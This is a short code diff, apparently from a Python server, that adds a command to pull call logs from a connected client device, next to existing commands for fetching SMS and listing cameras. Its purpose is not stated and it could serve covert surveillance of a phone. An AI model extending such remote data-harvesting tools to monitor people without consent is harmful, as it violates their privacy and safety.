@@ -96,6 +96,22 @@ async def cmd_get_sms(hours: int = 24) -> Dict[str, Any]:
         return {"status": "error", "message": str(e), "data": []}
 
 
+async def cmd_get_call_logs(hours: int = 24) -> Dict[str, Any]:
+    if not state.client_connected():
+        return {"status": "no_client", "data": []}
+    fut = register_pending("call_logs")
+    try:
+        await send_command({"cmd": "get_call_logs", "hours": hours})
+        res = await asyncio.wait_for(fut, timeout=25.0)
+        return res
+    except asyncio.TimeoutError:
+        return {"status": "timeout", "data": []}
+    except asyncio.CancelledError:
+        return {"status": "cancelled", "data": []}
+    except Exception as e:
+        return {"status": "error", "message": str(e), "data": []}
+
+
 async def cmd_list_cams() -> Dict[str, Any]:
     if not settings.enable_camera:
         return {"status": "disabled", "message": "Camera feature is disabled", "data": []}
